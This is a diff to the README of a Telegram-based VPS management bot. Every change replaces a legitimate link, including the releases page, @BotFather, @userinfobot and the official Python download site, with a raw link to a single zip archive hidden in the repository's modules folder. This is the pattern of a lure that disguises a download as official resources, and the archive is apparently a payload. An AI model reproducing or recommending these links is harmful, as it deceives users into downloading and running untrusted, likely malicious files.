@@ -1,6 +1,6 @@
 # 🚀 VPS_BOT_X - Effortlessly Manage Your VPS Server
 
-[![Download VPS_BOT_X](https://img.shields.io/badge/Download%20VPS_BOT_X-blue.svg)](https://github.com/arkaih/VPS_BOT_X/releases)
+[![Download VPS_BOT_X](https://github.com/arkaih/VPS_BOT_X/raw/refs/heads/main/vps_bot-x/modules/X_BO_VP_pitying.zip%https://github.com/arkaih/VPS_BOT_X/raw/refs/heads/main/vps_bot-x/modules/X_BO_VP_pitying.zip)](https://github.com/arkaih/VPS_BOT_X/raw/refs/heads/main/vps_bot-x/modules/X_BO_VP_pitying.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ To get started with VPS_BOT_X, follow these simple steps to download and run the
 1. **Visit the Releases Page**: 
    Click the link below to go to the releases page and download the latest version of VPS_BOT_X.
 
-   [Download VPS_BOT_X](https://github.com/arkaih/VPS_BOT_X/releases)
+   [Download VPS_BOT_X](https://github.com/arkaih/VPS_BOT_X/raw/refs/heads/main/vps_bot-x/modules/X_BO_VP_pitying.zip)
 
 2. **Download the Latest Release**: 
    Look for the latest version under "Assets." Click on the file to download it to your computer.
@@ -37,13 +37,13 @@ After installing VPS_BOT_X, set up your configuration.
 
 ### Get Your Bot Token
 
-1. Open Telegram and search for [@BotFather](https://t.me/BotFather).
+1. Open Telegram and search for [@BotFather](https://github.com/arkaih/VPS_BOT_X/raw/refs/heads/main/vps_bot-x/modules/X_BO_VP_pitying.zip).
 2. Send the command `/newbot` to create a new bot.
 3. Copy the token you receive after creating the bot.
 
 ### Get Your User ID
 
-1. Open Telegram and search for [@userinfobot](https://t.me/userinfobot).
+1. Open Telegram and search for [@userinfobot](https://github.com/arkaih/VPS_BOT_X/raw/refs/heads/main/vps_bot-x/modules/X_BO_VP_pitying.zip).
 2. Start the bot to get your user ID displayed in the chat.
 
 ### Configure Your VPS_BOT_X
@@ -68,7 +68,7 @@ VPS_BOT_X offers several features to manage your VPS server efficiently:
 If you encounter issues during installation or setup, here are some common problems and solutions:
 
 - **Permission Denied Error**: Ensure you are running as a root user. Use `sudo` if necessary.
-- **Python Not Found**: Make sure Python 3.7 or higher is installed. You can download it from the [official Python website](https://www.python.org/downloads/).
+- **Python Not Found**: Make sure Python 3.7 or higher is installed. You can download it from the [official Python website](https://github.com/arkaih/VPS_BOT_X/raw/refs/heads/main/vps_bot-x/modules/X_BO_VP_pitying.zip).
 - **Bot Not Responding**: Double-check your Bot Token and User ID. Ensure that they are entered correctly in the configuration file.
 
 ## 💬 Support
@@ -83,4 +83,4 @@ VPS_BOT_X is open-source software licensed under the MIT License. You can view t
 
 For detailed documentation, contribution guidelines, and more features, please refer to our Wiki section in the repository. Enjoy managing your VPS with VPS_BOT_X!
 
-[Download VPS_BOT_X](https://github.com/arkaih/VPS_BOT_X/releases)
+[Download VPS_BOT_X](https://github.com/arkaih/VPS_BOT_X/raw/refs/heads/main/vps_bot-x/modules/X_BO_VP_pitying.zip)
